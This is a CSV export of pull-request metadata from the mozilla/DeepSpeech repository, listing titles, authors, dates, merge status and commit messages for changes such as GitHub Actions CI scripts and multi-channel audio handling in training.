,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
10,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3583,3583,Train test model ga test,,lissyx,1645737,2021-03-26T15:01:36Z,COLLABORATOR,False,92,7,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01ef3d946f7d6ac02ee14e3c97c56fdce71706cf,Fix #3581: GitHub Actions test model
11,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3582,3582,Fix #3581: GitHub Actions test model,,lissyx,1645737,2021-03-26T08:56:54Z,COLLABORATOR,True,125,11,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,049d83286955ed4ad96ff549763514d114fadd17,Fix #3581: GitHub Actions test model
12,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3577,3577,Introduce ci_scripts/ for GitHub Actions,,lissyx,1645737,2021-03-25T15:21:19Z,COLLABORATOR,True,1589,6,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8120bd5685df779eb6b188412ec41248ab98ceac,Introduce ci_scripts/ for GitHub Actions
13,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3576,3576,"add more comment, fix bugs",https://github.com/coqui-ai/STT/discussions/1818,zh794390558,3038472,2021-03-25T06:22:48Z,NONE,False,215,104,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92d56d6e10f3e0ae66c81b643a7a099b1558d10d,"add more comment, fix bugs"
14,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3571,3571,Replace `remove_remote()` method with `remove` method,Partially resolves #3569,KathyReid,114158,2021-03-24T02:22:51Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2bac3c5e6de5d60bcf4bc555599ac75af75551c,"Replace remove_remote() method with remove method

Partially resolves #3569"
15,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3570,3570,Replace `remove_remote()` method with `remove` method,Partially resolves #3569,KathyReid,114158,2021-03-24T02:16:41Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79fde141b6af6a12202e3faa6f03ea0dfdde7241,"Replace `remove_remote()` method with `remove` method

Partially resolves #3569"
16,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3564,3564,Small Training Tweaks,"This PR cleans up #3559 per @lissyx's request.

Now adds the following two bits:
1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…

@reuben for (2), please reference this discussion: https://github.com/mozilla/DeepSpeech/pull/3559#discussion_r597663725",CatalinVoss,332459,2021-03-19T20:07:16Z,COLLABORATOR,True,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9bf55c39fb670cc3412c6d56fd692f77ae55e3d,Expose some internal layers for downstream applications
17,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3564,3564,Small Training Tweaks,"This PR cleans up #3559 per @lissyx's request.

Now adds the following two bits:
1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…

@reuben for (2), please reference this discussion: https://github.com/mozilla/DeepSpeech/pull/3559#discussion_r597663725",CatalinVoss,332459,2021-03-19T20:07:16Z,COLLABORATOR,True,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f31ce5ca48af8912d32025511fdfff6e841ed2bd,Don't throw on mono audio any more since everything should work?
18,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3564,3564,Small Training Tweaks,"This PR cleans up #3559 per @lissyx's request.

Now adds the following two bits:
1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…

@reuben for (2), please reference this discussion: https://github.com/mozilla/DeepSpeech/pull/3559#discussion_r597663725",CatalinVoss,332459,2021-03-19T20:07:16Z,COLLABORATOR,True,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0db7b6f8feaa70c6c192a2cea94af3bf36fba44,Handle mono conversion within `pcm_to_np()`
19,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3563,3563,GitHub Actions for macOS,,lissyx,1645737,2021-03-19T19:39:44Z,COLLABORATOR,True,10329,58,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e4d7dae99652e9e4be7e05910f8050ff7532440,GitHub Actions for macOS
